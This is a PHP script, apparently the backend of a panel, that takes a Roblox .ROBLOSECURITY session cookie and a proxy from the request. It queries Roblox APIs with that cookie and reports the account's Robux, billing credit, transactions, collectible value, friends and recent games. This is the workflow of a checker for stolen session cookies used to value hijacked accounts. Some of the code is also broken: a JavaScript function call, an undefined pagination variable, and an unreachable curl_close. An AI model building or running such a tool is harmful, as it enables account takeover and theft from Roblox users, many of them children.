<?php
include('../../controlPage/apis/function.php');
header('content-type: application/json');
if (!isset($_SERVER['HTTP_REFERER'])) {
http_response_code(400);
die(json_encode(['errors' => [['code' => 400, 'message' => 'BadRequest']]]));
} else {
$roblosecurity = $_GET['cookie'];
$proxy = explode(':', base64_decode($_GET['proxy']));
function csrf($roblosecurity, $proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.roblox.com/');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy[0].":".$proxy[1]);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[2].":".$proxy[3]);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Cookie: .ROBLOSECURITY=' . $roblosecurity
    ));
    $html = curl_exec($ch);
    curl_close($ch);
    $doc = new DOMDocument();
    @$doc->loadHTML($html);
    $metas = $doc->getElementsByTagName('meta');
    for ($i = 0;$i < $metas->length;$i++) {
        $csrf = $metas->item($i)->getAttribute('data-token');
    }
    return $csrf;
}
function information($url, $roblosecurity, $proxy) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Cookie: .ROBLOSECURITY=' . $roblosecurity
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy[0].":".$proxy[1]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[2].":".$proxy[3]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
return json_decode(curl_exec($ch) , true);
curl_close($ch);
}
function recentlyPlayed($roblosecurity, $proxy){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://apis.roblox.com/discovery-api/omni-recommendation');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy[0].":".$proxy[1]);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[2].":".$proxy[3]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array(
    'pageType'=>'Home',
    'sessionId'=>'null'
    )));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'content-type: application/json',
        'cookie: .ROBLOSECURITY=' . $roblosecurity,
        'x-csrf-token: ' . csrf($roblosecurity, $proxy)
    ));
    $games = json_decode(curl_exec($ch), true);
    curl_close($ch);
    foreach ($games['sorts'] as $sorts){
    if($sorts['topic'] == 'Continue'){
    foreach ($sorts['recommendationList'] as $game){
    $recentlyPlayed .= ''.$game['contentId'].', ';
    }
    }
    }
    foreach(json_decode(file_get_contents('https://games.roblox.com/v1/games?universeIds='.encodeURIComponent($recentlyPlayed)), true)['data'] as $experience){
    $Continue.= ''.$experience['name'].', ';
    }
    return $Continue;
}
function limited($userid, $roblosecurity, $proxy)
{
    $cursor = '';
    $rap = 0;
    $value = 0;
    $count = 0;
    $details = json_decode(file_get_contents('https://api.rblx.trade/api/v1/catalog/all') , true);
    while ($cursor !== null)
    {
        foreach (information('https://inventory.roblox.com/v1/users/' . $userid . '/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=' . $cursor . '', $roblosecurity, $proxy) ['data'] as $item)
        {
            $rap += $item['recentAveragePrice'];
            $count++;
            foreach ($details as $detail)
            {
                if ($detail['roblox_assetid'] == $item['assetId'])
                {
                    $value += $detail['roblox_value'];
                }
            }
        }
        $cursor = $data['nextPageCursor'] ? $data['nextPageCursor'] : null;
    }

    return json_decode(json_encode(array(
        'count' => $count,
        'rap' => $rap,
        'value' => $value
    )) , true);
}
$mobile = information('https://www.roblox.com/mobileapi/userinfo', $roblosecurity, $proxy);
$settings = information('https://www.roblox.com/my/settings/json', $roblosecurity, $proxy);
$friends = information('https://friends.roblox.com/v1/users/'.$mobile['UserID'].'/friends/count', $roblosecurity, $proxy);
$followers = information('https://friends.roblox.com/v1/users/'.$mobile['UserID'].'/followers/count', $roblosecurity, $proxy);
$followings = information('https://friends.roblox.com/v1/users/'.$mobile['UserID'].'/followings/count', $roblosecurity, $proxy);
$transactions = information('https://economy.roblox.com/v2/users/' . $mobile['UserID'] . '/transaction-totals?timeFrame=Year&transactionType=summary', $roblosecurity, $proxy);
$credit = information('https://billing.roblox.com/v1/credit', $roblosecurity, $proxy);
$mobile['IsPremium'] = $mobile['IsPremium'] ? 'Yes' : 'No';
$limiteds = limited($mobile['UserID'], $roblosecurity, $proxy);
$thumbnail = json_decode(file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=" . $mobile["UserID"] . "&size=352x352&format=Png&isCircular=false"), true);
$avatar = $thumbnail['data']['0']['imageUrl'];
die(json_encode(array('userid'=>$mobile['UserID'],'username'=>$mobile['UserName'],'age'=>''.$settings['AccountAgeInDays'].' Days','robux'=>$mobile['RobuxBalance'],'avatar'=>$avatar,'friends'=>$friends['count'],'followers'=>$followers['count'],'followings'=>$followings['count'],'displayname'=>$settings['DisplayName'],'incoming'=>$transactions['incomingRobuxTotal'],'outgoing'=>$transactions['outgoingRobuxTotal'],'premium'=>$mobile['IsPremium'],'rap'=>$limiteds['rap'],'collectibles'=>$limiteds['count'],'credit'=>'$'.$credit['balance'].'','estimated'=>$credit['robuxAmount'],'game'=>recentlyPlayed($roblosecurity, $proxy))));
}
?>